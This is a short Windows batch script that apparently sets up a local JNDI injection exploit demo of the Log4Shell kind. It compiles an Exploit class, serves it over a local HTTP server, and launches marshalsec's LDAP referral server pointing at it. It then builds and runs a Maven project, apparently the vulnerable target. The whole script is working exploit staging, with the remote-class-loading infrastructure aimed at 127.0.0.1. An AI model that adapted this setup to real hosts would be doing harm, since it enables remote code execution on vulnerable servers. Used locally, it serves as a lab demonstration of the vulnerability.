javac Exploit.java
start python -m http.server 8888
start java -cp tools/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
ping -n 2 127.0.0.1 > NUL
start cmd /k "echo To run the exploitation && pause && mvn package && mvn exec:exec"
